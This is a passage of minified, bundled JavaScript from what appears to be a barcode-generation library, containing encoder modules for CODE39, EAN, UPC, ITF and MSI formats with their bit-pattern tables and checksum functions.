e&&e.__esModule?e:{default:e}}n.CODE128=r.default,n.CODE128A=i.default,n.CODE128B=a.default,n.CODE128C=o.default},{"./CODE128A.js":50,"./CODE128B.js":51,"./CODE128C.js":52,"./CODE128_AUTO.js":53}],57:[function(e,t,n){Object.defineProperty(n,"__esModule",{value:!0}),n.CODE39=void 0;var r,i=function(){function e(e,t){for(var n=0;n<t.length;n++){var r=t[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(e,r.key,r)}}return function(t,n,r){return n&&e(t.prototype,n),r&&e(t,r),t}}(),a=(r=e("../Barcode.js"))&&r.__esModule?r:{default:r},o=function(e){function t(e,n){var r;return function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t),e=e.toUpperCase(),n.mod43&&(e+=(r=function(e){for(var t=0,n=0;n<e.length;n++)t+=u(e[n]);return t%43}(e),s[r])),function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!==_typeof2(t)&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,n))}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+_typeof2(t));e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,a.default),i(t,[{key:"encode",value:function(){for(var e=c("*"),t=0;t<this.data.length;t++)e+=c(this.data[t])+"0";return{data:e+=c("*"),text:this.text}}},{key:"valid",value:function(){return-1!==this.data.search(/^[0-9A-Z\-\.\ \$\/\+\%]+$/)}}]),t}(),s=["0","1","2","3","4","5","6","7","8","9","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","-","."," ","$","/","+","%","*"],l=[20957,29783,23639,30485,20951,29813,23669,20855,29789,23645,29975,23831,30533,22295,30149,24005,21623,29981,23837,22301,30023,23879,30545,22343,30161,24017,21959,30065,23921,22385,29015,18263,29141,17879,29045,18293,17783,29021,18269,17477,17489,17681,20753,35770];function c(e){return t=u(e),l[t].toString(2);var t}function u(e){return s.indexOf(e)}n.CODE39=o},{"../Barcode.js":48}],58:[function(e,t,n){Object.defineProperty(n,"__esModule",{value:!0});var r=function(){function e(e,t){for(var n=0;n<t.length;n++){var r=t[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(e,r.key,r)}}return function(t,n,r){return n&&e(t.prototype,n),r&&e(t,r),t}}(),i=e("./constants"),a=s(e("./encoder")),o=s(e("../Barcode"));function s(e){return e&&e.__esModule?e:{default:e}}var l=function(e){function t(e,n){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t);var r=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!==_typeof2(t)&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,n));return r.fontSize=!n.flat&&n.fontSize>10*n.width?10*n.width:n.fontSize,r.guardHeight=n.height+r.fontSize/2+n.textMargin,r}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+_typeof2(t));e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,o.default),r(t,[{key:"encode",value:function(){return this.options.flat?this.encodeFlat():this.encodeGuarded()}},{key:"leftText",value:function(e,t){return this.text.substr(e,t)}},{key:"leftEncode",value:function(e,t){return(0,a.default)(e,t)}},{key:"rightText",value:function(e,t){return this.text.substr(e,t)}},{key:"rightEncode",value:function(e,t){return(0,a.default)(e,t)}},{key:"encodeGuarded",value:function(){var e={fontSize:this.fontSize},t={height:this.guardHeight};return[{data:i.SIDE_BIN,options:t},{data:this.leftEncode(),text:this.leftText(),options:e},{data:i.MIDDLE_BIN,options:t},{data:this.rightEncode(),text:this.rightText(),options:e},{data:i.SIDE_BIN,options:t}]}},{key:"encodeFlat",value:function(){return{data:[i.SIDE_BIN,this.leftEncode(),i.MIDDLE_BIN,this.rightEncode(),i.SIDE_BIN].join(""),text:this.text}}}]),t}();n.default=l},{"../Barcode":48,"./constants":65,"./encoder":66}],59:[function(e,t,n){Object.defineProperty(n,"__esModule",{value:!0});var r,i=function(){function e(e,t){for(var n=0;n<t.length;n++){var r=t[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(e,r.key,r)}}return function(t,n,r){return n&&e(t.prototype,n),r&&e(t,r),t}}(),a=function e(t,n,r){null===t&&(t=Function.prototype);var i=Object.getOwnPropertyDescriptor(t,n);if(void 0===i){var a=Object.getPrototypeOf(t);return null===a?void 0:e(a,n,r)}if("value"in i)return i.value;var o=i.get;return void 0!==o?o.call(r):void 0},o=e("./constants"),s=(r=e("./EAN"))&&r.__esModule?r:{default:r},l=function(e){return(10-e.substr(0,12).split("").map((function(e){return+e})).reduce((function(e,t,n){return n%2?e+3*t:e+t}),0)%10)%10},c=function(e){function t(e,n){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t),-1!==e.search(/^[0-9]{12}$/)&&(e+=l(e));var r=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!==_typeof2(t)&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,n));return r.lastChar=n.lastChar,r}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+_typeof2(t));e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,s.default),i(t,[{key:"valid",value:function(){return-1!==this.data.search(/^[0-9]{13}$/)&&+this.data[12]===l(this.data)}},{key:"leftText",value:function(){return a(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"leftText",this).call(this,1,6)}},{key:"leftEncode",value:function(){var e=this.data.substr(1,6),n=o.EAN13_STRUCTURE[this.data[0]];return a(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"leftEncode",this).call(this,e,n)}},{key:"rightText",value:function(){return a(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"rightText",this).call(this,7,6)}},{key:"rightEncode",value:function(){var e=this.data.substr(7,6);return a(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"rightEncode",this).call(this,e,"RRRRRR")}},{key:"encodeGuarded",value:function(){var e=a(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"encodeGuarded",this).call(this);return this.options.displayValue&&(e.unshift({data:"000000000000",text:this.text.substr(0,1),options:{textAlign:"left",fontSize:this.fontSize}}),this.options.lastChar&&(e.push({data:"00"}),e.push({data:"00000",text:this.options.lastChar,options:{fontSize:this.fontSize}}))),e}}]),t}();n.default=c},{"./EAN":58,"./constants":65}],60:[function(e,t,n){Object.defineProperty(n,"__esModule",{value:!0});var r=function(){function e(e,t){for(var n=0;n<t.length;n++){var r=t[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(e,r.key,r)}}return function(t,n,r){return n&&e(t.prototype,n),r&&e(t,r),t}}(),i=e("./constants"),a=s(e("./encoder")),o=s(e("../Barcode"));function s(e){return e&&e.__esModule?e:{default:e}}var l=function(e){function t(e,n){return function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t),function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!==_typeof2(t)&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,n))}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+_typeof2(t));e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,o.default),r(t,[{key:"valid",value:function(){return-1!==this.data.search(/^[0-9]{2}$/)}},{key:"encode",value:function(){var e=i.EAN2_STRUCTURE[parseInt(this.data)%4];return{data:"1011"+(0,a.default)(this.data,e,"01"),text:this.text}}}]),t}();n.default=l},{"../Barcode":48,"./constants":65,"./encoder":66}],61:[function(e,t,n){Object.defineProperty(n,"__esModule",{value:!0});var r=function(){function e(e,t){for(var n=0;n<t.length;n++){var r=t[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(e,r.key,r)}}return function(t,n,r){return n&&e(t.prototype,n),r&&e(t,r),t}}(),i=e("./constants"),a=s(e("./encoder")),o=s(e("../Barcode"));function s(e){return e&&e.__esModule?e:{default:e}}var l=function(e){function t(e,n){return function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t),function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!==_typeof2(t)&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,n))}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+_typeof2(t));e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,o.default),r(t,[{key:"valid",value:function(){return-1!==this.data.search(/^[0-9]{5}$/)}},{key:"encode",value:function(){var e,t=i.EAN5_STRUCTURE[(e=this.data,e.split("").map((function(e){return+e})).reduce((function(e,t,n){return n%2?e+9*t:e+3*t}),0)%10)];return{data:"1011"+(0,a.default)(this.data,t,"01"),text:this.text}}}]),t}();n.default=l},{"../Barcode":48,"./constants":65,"./encoder":66}],62:[function(e,t,n){Object.defineProperty(n,"__esModule",{value:!0});var r,i=function(){function e(e,t){for(var n=0;n<t.length;n++){var r=t[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(e,r.key,r)}}return function(t,n,r){return n&&e(t.prototype,n),r&&e(t,r),t}}(),a=function e(t,n,r){null===t&&(t=Function.prototype);var i=Object.getOwnPropertyDescriptor(t,n);if(void 0===i){var a=Object.getPrototypeOf(t);return null===a?void 0:e(a,n,r)}if("value"in i)return i.value;var o=i.get;return void 0!==o?o.call(r):void 0},o=(r=e("./EAN"))&&r.__esModule?r:{default:r},s=function(e){return(10-e.substr(0,7).split("").map((function(e){return+e})).reduce((function(e,t,n){return n%2?e+t:e+3*t}),0)%10)%10},l=function(e){function t(e,n){return function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t),-1!==e.search(/^[0-9]{7}$/)&&(e+=s(e)),function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!==_typeof2(t)&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,n))}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+_typeof2(t));e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,o.default),i(t,[{key:"valid",value:function(){return-1!==this.data.search(/^[0-9]{8}$/)&&+this.data[7]===s(this.data)}},{key:"leftText",value:function(){return a(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"leftText",this).call(this,0,4)}},{key:"leftEncode",value:function(){var e=this.data.substr(0,4);return a(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"leftEncode",this).call(this,e,"LLLL")}},{key:"rightText",value:function(){return a(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"rightText",this).call(this,4,4)}},{key:"rightEncode",value:function(){var e=this.data.substr(4,4);return a(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"rightEncode",this).call(this,e,"RRRR")}}]),t}();n.default=l},{"./EAN":58}],63:[function(e,t,n){Object.defineProperty(n,"__esModule",{value:!0});var r=function(){function e(e,t){for(var n=0;n<t.length;n++){var r=t[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(e,r.key,r)}}return function(t,n,r){return n&&e(t.prototype,n),r&&e(t,r),t}}();n.checksum=l;var i=o(e("./encoder")),a=o(e("../Barcode.js"));function o(e){return e&&e.__esModule?e:{default:e}}var s=function(e){function t(e,n){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t),-1!==e.search(/^[0-9]{11}$/)&&(e+=l(e));var r=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!==_typeof2(t)&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,n));return r.displayValue=n.displayValue,n.fontSize>10*n.width?r.fontSize=10*n.width:r.fontSize=n.fontSize,r.guardHeight=n.height+r.fontSize/2+n.textMargin,r}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+_typeof2(t));e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,a.default),r(t,[{key:"valid",value:function(){return-1!==this.data.search(/^[0-9]{12}$/)&&this.data[11]==l(this.data)}},{key:"encode",value:function(){return this.options.flat?this.flatEncoding():this.guardedEncoding()}},{key:"flatEncoding",value:function(){var e="";return e+="101",e+=(0,i.default)(this.data.substr(0,6),"LLLLLL"),e+="01010",e+=(0,i.default)(this.data.substr(6,6),"RRRRRR"),{data:e+="101",text:this.text}}},{key:"guardedEncoding",value:function(){var e=[];return this.displayValue&&e.push({data:"00000000",text:this.text.substr(0,1),options:{textAlign:"left",fontSize:this.fontSize}}),e.push({data:"101"+(0,i.default)(this.data[0],"L"),options:{height:this.guardHeight}}),e.push({data:(0,i.default)(this.data.substr(1,5),"LLLLL"),text:this.text.substr(1,5),options:{fontSize:this.fontSize}}),e.push({data:"01010",options:{height:this.guardHeight}}),e.push({data:(0,i.default)(this.data.substr(6,5),"RRRRR"),text:this.text.substr(6,5),options:{fontSize:this.fontSize}}),e.push({data:(0,i.default)(this.data[11],"R")+"101",options:{height:this.guardHeight}}),this.displayValue&&e.push({data:"00000000",text:this.text.substr(11,1),options:{textAlign:"right",fontSize:this.fontSize}}),e}}]),t}();function l(e){var t,n=0;for(t=1;t<11;t+=2)n+=parseInt(e[t]);for(t=0;t<11;t+=2)n+=3*parseInt(e[t]);return(10-n%10)%10}n.default=s},{"../Barcode.js":48,"./encoder":66}],64:[function(e,t,n){Object.defineProperty(n,"__esModule",{value:!0});var r=function(){function e(e,t){for(var n=0;n<t.length;n++){var r=t[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(e,r.key,r)}}return function(t,n,r){return n&&e(t.prototype,n),r&&e(t,r),t}}(),i=s(e("./encoder")),a=s(e("../Barcode.js")),o=e("./UPC.js");function s(e){return e&&e.__esModule?e:{default:e}}function l(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!==_typeof2(t)&&"function"!=typeof t?e:t}var c=["XX00000XXX","XX10000XXX","XX20000XXX","XXX00000XX","XXXX00000X","XXXXX00005","XXXXX00006","XXXXX00007","XXXXX00008","XXXXX00009"],u=[["EEEOOO","OOOEEE"],["EEOEOO","OOEOEE"],["EEOOEO","OOEEOE"],["EEOOOE","OOEEEO"],["EOEEOO","OEOOEE"],["EOOEEO","OEEOOE"],["EOOOEE","OEEEOO"],["EOEOEO","OEOEOE"],["EOEOOE","OEOEEO"],["EOOEOE","OEEOEO"]],d=function(e){function t(e,n){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t);var r=l(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,n));if(r.isValid=!1,-1!==e.search(/^[0-9]{6}$/))r.middleDigits=e,r.upcA=p(e,"0"),r.text=n.text||""+r.upcA[0]+e+r.upcA[r.upcA.length-1],r.isValid=!0;else{if(-1===e.search(/^[01][0-9]{7}$/))return l(r);if(r.middleDigits=e.substring(1,e.length-1),r.upcA=p(r.middleDigits,e[0]),r.upcA[r.upcA.length-1]!==e[e.length-1])return l(r);r.isValid=!0}return r.displayValue=n.displayValue,n.fontSize>10*n.width?r.fontSize=10*n.width:r.fontSize=n.fontSize,r.guardHeight=n.height+r.fontSize/2+n.textMargin,r}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+_typeof2(t));e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,a.default),r(t,[{key:"valid",value:function(){return this.isValid}},{key:"encode",value:function(){return this.options.flat?this.flatEncoding():this.guardedEncoding()}},{key:"flatEncoding",value:function(){var e="";return e+="101",e+=this.encodeMiddleDigits(),{data:e+="010101",text:this.text}}},{key:"guardedEncoding",value:function(){var e=[];return this.displayValue&&e.push({data:"00000000",text:this.text[0],options:{textAlign:"left",fontSize:this.fontSize}}),e.push({data:"101",options:{height:this.guardHeight}}),e.push({data:this.encodeMiddleDigits(),text:this.text.substring(1,7),options:{fontSize:this.fontSize}}),e.push({data:"010101",options:{height:this.guardHeight}}),this.displayValue&&e.push({data:"00000000",text:this.text[7],options:{textAlign:"right",fontSize:this.fontSize}}),e}},{key:"encodeMiddleDigits",value:function(){var e=this.upcA[0],t=this.upcA[this.upcA.length-1],n=u[parseInt(t)][parseInt(e)];return(0,i.default)(this.middleDigits,n)}}]),t}();function p(e,t){for(var n=parseInt(e[e.length-1]),r=c[n],i="",a=0,s=0;s<r.length;s++){var l=r[s];i+="X"===l?e[a++]:l}return(i=""+t+i)+(0,o.checksum)(i)}n.default=d},{"../Barcode.js":48,"./UPC.js":63,"./encoder":66}],65:[function(e,t,n){Object.defineProperty(n,"__esModule",{value:!0}),n.SIDE_BIN="101",n.MIDDLE_BIN="01010",n.BINARIES={L:["0001101","0011001","0010011","0111101","0100011","0110001","0101111","0111011","0110111","0001011"],G:["0100111","0110011","0011011","0100001","0011101","0111001","0000101","0010001","0001001","0010111"],R:["1110010","1100110","1101100","1000010","1011100","1001110","1010000","1000100","1001000","1110100"],O:["0001101","0011001","0010011","0111101","0100011","0110001","0101111","0111011","0110111","0001011"],E:["0100111","0110011","0011011","0100001","0011101","0111001","0000101","0010001","0001001","0010111"]},n.EAN2_STRUCTURE=["LL","LG","GL","GG"],n.EAN5_STRUCTURE=["GGLLL","GLGLL","GLLGL","GLLLG","LGGLL","LLGGL","LLLGG","LGLGL","LGLLG","LLGLG"],n.EAN13_STRUCTURE=["LLLLLL","LLGLGG","LLGGLG","LLGGGL","LGLLGG","LGGLLG","LGGGLL","LGLGLG","LGLGGL","LGGLGL"]},{}],66:[function(e,t,n){Object.defineProperty(n,"__esModule",{value:!0});var r=e("./constants");n.default=function(e,t,n){var i=e.split("").map((function(e,n){return r.BINARIES[t[n]]})).map((function(t,n){return t?t[e[n]]:""}));if(n){var a=e.length-1;i=i.map((function(e,t){return t<a?e+n:e}))}return i.join("")}},{"./constants":65}],67:[function(e,t,n){Object.defineProperty(n,"__esModule",{value:!0}),n.UPCE=n.UPC=n.EAN2=n.EAN5=n.EAN8=n.EAN13=void 0;var r=c(e("./EAN13.js")),i=c(e("./EAN8.js")),a=c(e("./EAN5.js")),o=c(e("./EAN2.js")),s=c(e("./UPC.js")),l=c(e("./UPCE.js"));function c(e){return e&&e.__esModule?e:{default:e}}n.EAN13=r.default,n.EAN8=i.default,n.EAN5=a.default,n.EAN2=o.default,n.UPC=s.default,n.UPCE=l.default},{"./EAN13.js":59,"./EAN2.js":60,"./EAN5.js":61,"./EAN8.js":62,"./UPC.js":63,"./UPCE.js":64}],68:[function(e,t,n){Object.defineProperty(n,"__esModule",{value:!0}),n.GenericBarcode=void 0;var r,i=function(){function e(e,t){for(var n=0;n<t.length;n++){var r=t[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(e,r.key,r)}}return function(t,n,r){return n&&e(t.prototype,n),r&&e(t,r),t}}(),a=(r=e("../Barcode.js"))&&r.__esModule?r:{default:r},o=function(e){function t(e,n){return function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t),function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!==_typeof2(t)&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,n))}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+_typeof2(t));e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,a.default),i(t,[{key:"encode",value:function(){return{data:"10101010101010101010101010101010101010101",text:this.text}}},{key:"valid",value:function(){return!0}}]),t}();n.GenericBarcode=o},{"../Barcode.js":48}],69:[function(e,t,n){Object.defineProperty(n,"__esModule",{value:!0});var r,i=function(){function e(e,t){for(var n=0;n<t.length;n++){var r=t[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(e,r.key,r)}}return function(t,n,r){return n&&e(t.prototype,n),r&&e(t,r),t}}(),a=e("./constants"),o=(r=e("../Barcode"))&&r.__esModule?r:{default:r},s=function(e){function t(){return function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t),function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!==_typeof2(t)&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).apply(this,arguments))}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+_typeof2(t));e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,o.default),i(t,[{key:"valid",value:function(){return-1!==this.data.search(/^([0-9]{2})+$/)}},{key:"encode",value:function(){var e=this,t=this.data.match(/.{2}/g).map((function(t){return e.encodePair(t)})).join("");return{data:a.START_BIN+t+a.END_BIN,text:this.text}}},{key:"encodePair",value:function(e){var t=a.BINARIES[e[1]];return a.BINARIES[e[0]].split("").map((function(e,n){return("1"===e?"111":"1")+("1"===t[n]?"000":"0")})).join("")}}]),t}();n.default=s},{"../Barcode":48,"./constants":71}],70:[function(e,t,n){Object.defineProperty(n,"__esModule",{value:!0});var r,i=function(){function e(e,t){for(var n=0;n<t.length;n++){var r=t[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(e,r.key,r)}}return function(t,n,r){return n&&e(t.prototype,n),r&&e(t,r),t}}(),a=(r=e("./ITF"))&&r.__esModule?r:{default:r},o=function(e){var t=e.substr(0,13).split("").map((function(e){return parseInt(e,10)})).reduce((function(e,t,n){return e+t*(3-n%2*2)}),0);return 10*Math.ceil(t/10)-t},s=function(e){function t(e,n){return function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t),-1!==e.search(/^[0-9]{13}$/)&&(e+=o(e)),function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!==_typeof2(t)&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,n))}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+_typeof2(t));e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,a.default),i(t,[{key:"valid",value:function(){return-1!==this.data.search(/^[0-9]{14}$/)&&+this.data[13]===o(this.data)}}]),t}();n.default=s},{"./ITF":69}],71:[function(e,t,n){Object.defineProperty(n,"__esModule",{value:!0}),n.START_BIN="1010",n.END_BIN="11101",n.BINARIES=["00110","10001","01001","11000","00101","10100","01100","00011","10010","01010"]},{}],72:[function(e,t,n){Object.defineProperty(n,"__esModule",{value:!0}),n.ITF14=n.ITF=void 0;var r=a(e("./ITF")),i=a(e("./ITF14"));function a(e){return e&&e.__esModule?e:{default:e}}n.ITF=r.default,n.ITF14=i.default},{"./ITF":69,"./ITF14":70}],73:[function(e,t,n){Object.defineProperty(n,"__esModule",{value:!0});var r,i=function(){function e(e,t){for(var n=0;n<t.length;n++){var r=t[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(e,r.key,r)}}return function(t,n,r){return n&&e(t.prototype,n),r&&e(t,r),t}}(),a=(r=e("../Barcode.js"))&&r.__esModule?r:{default:r},o=function(e){function t(e,n){return function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t),function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!==_typeof2(t)&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,n))}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+_typeof2(t));e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,a.default),i(t,[{key:"encode",value:function(){for(var e="110",t=0;t<this.data.length;t++){var n=parseInt(this.data[t]).toString(2);n=s(n,4-n.length);for(var r=0;r<n.length;r++)e+="0"==n[r]?"100":"110"}return{data:e+="1001",text:this.text}}},{key:"valid",value:function(){return-1!==this.data.search(/^[0-9]+$/)}}]),t}();function s(e,t){for(var n=0;n<t;n++)e="0"+e;return e}n.default=o},{"../Barcode.js":48}],74:[function(e,t,n){Object.defineProperty(n,"__esModule",{value:!0});var r,i=(r=e("./MSI.js"))&&r.__esModule?r:{default:r},a=e("./checksums.js"),o=function(e){function t(e,n){return function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t),function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!==_typeof2(t)&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e+(0,a.mod10)(e),n))}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+_typeof2(t));e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,i.default),t}();n.default=o},{"./MSI.js":73,"./checksums.js":78}],75:[function(e,t,n){Object.defineProperty(n,"__esModule",{value:!0});var r,i=(r=e("./MSI.js"))&&r.__esModule?r:{default:r},a=e("./checksums.js"),o=function(e){function t(e,n){return function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t),e+=(0,a.mod10)(e),e+=(0,a.mod10)(e),function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!==_typeof2(t)&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,n))}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+_typeof2(t));e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,i.default),t}();n.default=o},{"./MSI.js":73,"./checksums.js":78}],76:[function(e,t,n){Object.defineProperty(n,"__esModule",{value:!0});var r,i=(r=e("./MSI.js"))&&r.__esModule?r:{default:r},a=e("./checksums.js"),o=function(e){function t(e,n){return function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t),function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!==_typeof2(t)&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e+(0,a.mod11)(e),n))}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+_typeof2(t));e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,i.default),t}();n.default=o},{"./MSI.js":73,"./checksums.js":78}],77:[function(e,t,n){Object.defineProperty(n,"__esModule",{value:!0});var r,i=(r=e("./MSI.js"))&&r.__esModule?r:{default:r},a=e("./checksums.js"),o=function(e){function t(e,n){return function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t),e+=(0,a.mod11)(e),e+=(0,a.mod10)(e),function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!==_typeof2(t)&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,n))}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not 